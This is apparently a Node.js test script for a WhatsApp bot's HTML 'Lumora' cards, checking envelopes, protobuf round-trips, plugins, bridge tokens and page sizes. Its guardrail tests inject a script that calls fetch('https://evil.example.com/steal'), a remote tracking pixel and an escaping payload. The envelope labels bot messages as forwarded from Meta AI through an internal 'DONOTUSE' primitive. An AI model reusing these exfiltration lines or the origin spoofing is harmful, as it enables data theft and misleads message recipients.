"use strict";
// ╔═══════════════════════════════════════════════════════════════════╗
// ║  LUMORA UI WIRE CHECK                                             ║
// ╠═══════════════════════════════════════════════════════════════════╣
// ║  Proves, without a WhatsApp session, that a card leaves the socket ║
// ║  carrying every field the clients read:                           ║
// ║    1. the page is self-contained and passes the HTML guardrails   ║
// ║    2. the envelope is the verbatim richResponseMessage wrapper    ║
// ║    3. the base64 payload decodes back to the same HTML            ║
// ║    4. the protobuf round-trip keeps the payload byte-identical    ║
// ║    5. the plugin loader resolves the commands it claims to        ║
// ║                                                                   ║
// ║  Run: node scripts/lumora_ui_check.js                             ║
// ╚═══════════════════════════════════════════════════════════════════╝

const path = require("path");
const { pathToFileURL } = require("url");

const ui = require("../systems/lumoraUI.js");
const lumoraPlugins = require("../systems/lumoraPlugins.js");
const { generateWAMessageFromContent, proto } = require("@whiskeysockets/baileys");

const TEST_JID = "85376064581854@s.whatsapp.net";

let pass = 0;
let fail = 0;

function ok(label, cond, extra) {
  if (cond) {
    pass++;
    console.log("  ✅ " + label);
  } else {
    fail++;
    console.log("  ❌ " + label + (extra ? "  → " + extra : ""));
  }
}

function eq(label, actual, expected) {
  ok(label, actual === expected, "got " + JSON.stringify(actual) + ", want " + JSON.stringify(expected));
}

function checkHtml(html, opts) {
  return ui.checkHtml(html, opts);
}

function checkProblems(html, opts) {
  return ui.checkHtml(html, opts);
}

(async function main() {
  console.log("\n═══ 1. PLUGIN REGISTRY ═══");
  const plugins = await lumoraPlugins.list();
  ok("loader found at least one plugin", plugins.length > 0, "found " + plugins.length);
  for (const p of plugins) {
    console.log("     • " + p.name + " → " + p.command.join(", ") + "  (" + p.file + ")");
  }
  const hello = await lumoraPlugins.match("hello");
  ok(".hello resolves to the hello plugin", !!hello && hello.name === "hello", hello ? hello.name : "null");
  ok("unknown command resolves to null", (await lumoraPlugins.match("definitely-not-a-plugin")) === null);

  console.log("\n═══ 2. PAGE BUILD (cargo) ═══");
  const helloMod = await import(pathToFileURL(path.join(lumoraPlugins.PLUGIN_DIR, "hello.mjs")).href);
  const html = helloMod.buildHelloPage({
    player: { username: "Prime", level: 12, lucons: 7163 },
  });
  const problems = ui.checkHtml(html);
  ok("HTML guardrails clean", problems.length === 0, problems.join("; "));
  ok("single self-contained document", html.startsWith("<!DOCTYPE html>") && html.indexOf("</html>") > 0);
  ok("inline style block present", html.indexOf("<style>") > 0 && html.indexOf("</style>") > 0);
  ok("inline script block present", html.indexOf("<script>") > 0);
  ok("no template artifacts (` or ${)", html.indexOf("`") === -1 && html.indexOf("${") === -1);
  ok("page under the 30KB bubble budget", ui.byteSize(html) < ui.HTML_MAX_BYTES,
    ui.byteSize(html) + " bytes");
  ok("player name escaped into the header", html.indexOf("Prime") > 0);
  ok("uses the shared rarity palette", html.indexOf(ui.rarityColor("Mythic")) > 0);

  // A hostile name must not be able to break out of the page.
  const hostile = helloMod.buildHelloPage({
    player: { username: "</div><script>bad()</script>", level: 1, lucons: 0 },
  });
  ok("hostile player name is escaped", hostile.indexOf("<script>bad()") === -1 && hostile.indexOf("&lt;/div&gt;") > 0);

  console.log("\n═══ 3. ENVELOPE (the sacred wrapper) ═══");
  const envelope = await ui.buildLumoraUIEnvelope(html);
  const bfm = envelope.botForwardedMessage;
  ok("botForwardedMessage → message present", !!(bfm && bfm.message));
  const rr = bfm && bfm.message && bfm.message.richResponseMessage;
  ok("richResponseMessage present", !!rr);
  eq("messageType === 1 (AI_RICH_RESPONSE_TYPE_STANDARD)", rr && rr.messageType, 1);
  eq("contextInfo.isForwarded", rr && rr.contextInfo && rr.contextInfo.isForwarded, true);
  eq("contextInfo.forwardOrigin === 4 (META_AI)", rr && rr.contextInfo && rr.contextInfo.forwardOrigin, 4);
  ok("envelope has exactly the one wrapper key", Object.keys(envelope).join(",") === "botForwardedMessage");
  ok("richResponseMessage keys are stable",
    Object.keys(rr).sort().join(",") === "contextInfo,messageType,unifiedResponse",
    Object.keys(rr).join(","));

  console.log("\n═══ 4. PAYLOAD (the cargo) ═══");
  const decoded = ui.decodeLumoraPayload(rr.unifiedResponse.data);
  eq("__typename", decoded.__typename, "GenAIUnifiedResponse");
  ok("response_id is a uuid", /^[0-9a-f-]{36}$/.test(decoded.response_id));
  eq("sections length", decoded.sections.length, 1);
  const vm = decoded.sections[0].view_model;
  eq("section __typename", decoded.sections[0].__typename, "GenAIUnifiedResponseSection");
  eq("view_model __typename", vm.__typename, "GenAISingleLayoutViewModel");
  eq("primitive __typename", vm.primitive.__typename, "FOAHtmlPrimitiveDemoDONOTUSE");
  eq("trusted_sources is empty", JSON.stringify(vm.primitive.trusted_sources), "[]");
  eq("payload is the exact HTML", vm.primitive.payload, html);

  console.log("\n═══ 5. WIRE ROUND-TRIP (protobuf) ═══");
  const msg = await generateWAMessageFromContent(TEST_JID, envelope, {});
  ok("generateWAMessageFromContent produced a message", !!(msg && msg.message));
  eq("chat jid preserved", msg.key.remoteJid, TEST_JID);
  ok("message id assigned", typeof msg.key.id === "string" && msg.key.id.length > 5);

  const bytes = proto.Message.encode(msg.message).finish();
  const back = proto.Message.decode(bytes);
  const rr2 = back.botForwardedMessage && back.botForwardedMessage.message &&
    back.botForwardedMessage.message.richResponseMessage;
  ok("richResponseMessage survives protobuf encode/decode", !!rr2);
  eq("messageType survives", rr2 && rr2.messageType, 1);
  eq("forwardOrigin survives",
    rr2 && rr2.contextInfo && rr2.contextInfo.forwardOrigin, 4);
  const dataOut = rr2 && rr2.unifiedResponse && rr2.unifiedResponse.data;
  ok("base64 payload is byte-identical after the wire",
    Buffer.from(dataOut).toString("base64") === rr.unifiedResponse.data);
  ok("payload decodes to the same HTML after the wire",
    ui.decodeLumoraPayload(Buffer.from(dataOut).toString("base64")).sections[0].view_model.primitive.payload === html);
  ok("wire size is sane", bytes.length > 1000 && bytes.length < 200 * 1024, bytes.length + " bytes");
  ok("the old invalid nativeFlowMessage is gone from the envelope",
    JSON.stringify(envelope).indexOf("nativeFlowMessage") === -1 &&
    JSON.stringify(envelope).indexOf("tap_target") === -1);

  console.log("\n═══ 6. PLUGIN CONTRACT ═══");
  ok("plugin exports default {name, command, category, description, run}",
    !!hello && Array.isArray(hello.command) && typeof hello.run === "function" &&
    Array.isArray(hello.category) && typeof hello.description === "string");

  // The plugin's run() must be safe with no socket at all (never throws uncaught).
  let swallowed = false;
  try {
    await hello.run({
      feb: { relayMessage: () => { throw new Error("no socket in this test"); } },
      m: { chat: TEST_JID, reply: async () => {}, key: { id: "x" } },
      args: [],
      react: async () => {},
      player: { username: "Prime", level: 1, lucons: 0 },
    });
  } catch (e) {
    swallowed = false;
  }
  ok("run() resolves (errors handled inside try/catch)", swallowed === false);
  ok("run() built the same page the check asserted on",
    helloMod.buildHelloPage({ player: { username: "Prime", level: 1, lucons: 0 } }).indexOf("HELLO LUMORA") > 0);

  console.log("\n═══ 7. LUMORA_SEND (the one place that talks to the bot) ═══");
  ok("the shared script carries the helper markers",
    html.includes("/* LUMORA_SEND_START */") && html.includes("/* LUMORA_SEND_END */"));
  ok("the helper is exposed to every page", html.includes("window.LUMORA_SEND=") && html.includes("window.LUMORA_CHANNELS"));
  ok("the helper offers all three channels",
    html.includes("A-post") && html.includes("B-beacon") && html.includes("C-image"));
  ok("buttons are wired to the helper, not to fetch",
    html.includes("data-lumora-act") && html.includes("window.LUMORA_SEND(act,prm"));
  ok("the helper falls back to the command box when there is no link",
    /no bridge link/i.test(html), "helper text missing");

  const withoutHelper = html.replace(/\/\* LUMORA_SEND_START \*\/[\s\S]*?\/\* LUMORA_SEND_END \*\//g, "");
  ok("no fetch outside the helper", !/\bfetch\s*\(/.test(withoutHelper));
  ok("no sendBeacon outside the helper", !/sendBeacon\s*\(/.test(withoutHelper));

  console.log("\n═══ 8. GUARDRAILS CANNOT BE QUIETLY WIDENED ═══");
  const evilFetch = html.replace("<div class=\"wrap\"", "<script>fetch('https://evil.example.com/steal')</script><div class=\"wrap\"");
  ok("a second fetch is refused", checkProblems(evilFetch).some((p) => /fetch\(\) outside/.test(p)), checkProblems(evilFetch).join("; "));
  const evilImg = html.replace("<div class=\"wrap\"", "<img src='https://evil.example.com/pixel.png'><div class=\"wrap\"");
  ok("a remote image is refused", checkProblems(evilImg).some((p) => /remote image|external URL/.test(p)), checkProblems(evilImg).join("; "));
  const withBridgeUrl = html.replace("<div class=\"wrap\"", "<div class=\"wrap\" data-lumora-url=\"https://bridge.example.test\" data-lumora-token=\"x\"");
  const bridgePage = withBridgeUrl.replace("</body>", "<img src='https://bridge.example.test/lumora/act' alt=''></body>");
  ok("a URL on the card's own bridge is allowed", checkProblems(bridgePage).length === 0, checkProblems(bridgePage).join("; "));
  ok("a backtick in the page is still refused", checkProblems(html.replace("</body>", "`</body>")).some((p) => /backtick/.test(p)));

  console.log("\n═══ 9. BRIDGE CONTEXT (tokens for cards) ═══");
  process.env.LUMORA_BRIDGE_SECRET = "lumora-ui-check-secret";
  process.env.LUMORA_BRIDGE = "off";
  let ctxOff = ui.bridgeContext({ playerId: TEST_JID, chatId: "c@g.us", cardId: "x", actions: ["ping"] });
  ok("with the bridge off a card gets no link", ctxOff.enabled === false && ctxOff.token === "", JSON.stringify(ctxOff));

  delete process.env.LUMORA_BRIDGE;
  process.env.LUMORA_BRIDGE_URL = "https://bridge.example.test";
  const ctxOn = ui.bridgeContext({ playerId: TEST_JID, chatId: "c@g.us", cardId: "probe", actions: ["ping"] });
  ok("with the bridge on a card gets url + token", ctxOn.enabled === true && !!ctxOn.token && ctxOn.url === "https://bridge.example.test", JSON.stringify(ctxOn).slice(0, 120));
  const bridgeModule = require("../systems/lumoraBridge.js");
  const claim = bridgeModule.verifyToken(ctxOn.token);
  ok("the minted token verifies", claim.ok === true, JSON.stringify(claim));
  eq("the token is scoped to the player", claim.payload.playerId, TEST_JID);
  eq("the token is scoped to the card", claim.payload.cardId, "probe");
  ok("the token is scoped to the allowed actions",
    claim.payload.allowedActions.length === 1 && claim.payload.allowedActions[0] === "ping");
  ok("the secret is not in the token", ctxOn.token.indexOf(bridgeModule.getSecret().slice(0, 8)) === -1);

  console.log("\n═══ 10. THE PROBE CARD (.uiprobe) ═══");
  const probeMod = await import(pathToFileURL(path.join(lumoraPlugins.PLUGIN_DIR, "probe.mjs")).href);
  const probeHtml = probeMod.buildProbePage({
    player: { username: "Prime", level: 12, lucons: 7163 },
    bridge: ctxOn,
  });
  ok("the probe page passes the guardrails", checkProblems(probeHtml).length === 0, checkProblems(probeHtml).join("; "));
  ok("it carries its bridge link", probeHtml.includes('data-lumora-url="https://bridge.example.test"') && probeHtml.includes("data-lumora-token="));
  const rows = ["row-render", "row-js", "row-clip", "row-storage", "row-clock", "lum-channel-A", "lum-channel-B", "lum-channel-C"];
  ok("all eight probe rows exist", rows.every((r) => probeHtml.includes('id="' + r + '"')), rows.filter((r) => !probeHtml.includes('id="' + r + '"')).join(","));
  ok("the channel rows are written by the shared helper",
    probeHtml.includes("getElementById('lum-channel-'+ch)") || probeHtml.includes('lum-channel-'), "helper markup missing");
  ok("the probe page stays inside the design budget", ui.byteSize(probeHtml) < ui.HTML_MAX_BYTES, ui.byteSize(probeHtml) + " bytes");

  console.log("\n═══ 11. THE SIZE CARD (.uisize) ═══");
  const sizeMod = await import(pathToFileURL(path.join(lumoraPlugins.PLUGIN_DIR, "size.mjs")).href);
  const base = sizeMod.buildSizePage({ kb: 5 });
  const ten = sizeMod.buildSizePage({ kb: 10 });
  const forty = sizeMod.buildSizePage({ kb: 40 });
  const huge = sizeMod.buildSizePage({ kb: 500 });
  const tiny = sizeMod.buildSizePage({ kb: 1 });
  ok("the shared shell is already bigger than 5 KB", base.bytes > 5 * 1024, base.bytes + " bytes");
  eq("a 10 KB request needs no padding (the shell is the floor)", ten.count, 0);
  ok("a 40 KB request lands near 40 KB", forty.bytes >= 38 * 1024 && forty.bytes <= 44 * 1024, forty.bytes + " bytes");
  ok("padding goes up with the request", huge.bytes > forty.bytes && forty.bytes > ten.bytes);
  ok("an absurd size is clamped, not refused silently", huge.clamped === true && huge.kb === 200, JSON.stringify({ kb: huge.kb, clamped: huge.clamped }));
  ok("a tiny size is clamped up", tiny.clamped === true && tiny.kb === 5);
  // A 40 KB card is meant to break the design budget — and nothing else.
  const fortyProblems = checkProblems(forty.html);
  ok("the size card breaks the budget and nothing else",
    fortyProblems.length === 1 && /limit/.test(fortyProblems[0]),
    fortyProblems.join("; "));
  ok("a 10 KB card stays inside the budget",
    checkHtml(ten.html).length === 0, checkHtml(ten.html).join("; "));
  ok("the budget is enforced by default",
    checkHtml(forty.html).some((p) => /limit/.test(p)), checkHtml(forty.html).join("; "));
  ok("the budget can only be raised explicitly for one send",
    checkHtml(forty.html, { maxBytes: 300 * 1024 }).length === 0);

  console.log("\n═══ 12. REGISTRY (the canary must survive) ═══");
  const registered = (await lumoraPlugins.list()).map((p) => p.name).sort();
  ok("hello, probe and uisize are all registered",
    ["hello", "probe", "uisize"].every((n) => registered.includes(n)), registered.join(","));
  ok(".hello still resolves (the canary)", (await lumoraPlugins.match("hello")) !== null);
  ok(".uiprobe resolves", (await lumoraPlugins.match("uiprobe")) !== null);
  ok(".uisize resolves", (await lumoraPlugins.match("uisize")) !== null);

  console.log("\n────────────────────────────────");
  console.log(fail === 0 ? "ALL GREEN" : "FAILURES PRESENT");
  console.log("passed " + pass + " / " + (pass + fail));
  if (fail) process.exitCode = 1;
})().catch((e) => {
  console.error("check crashed:", e);
  process.exitCode = 1;
});
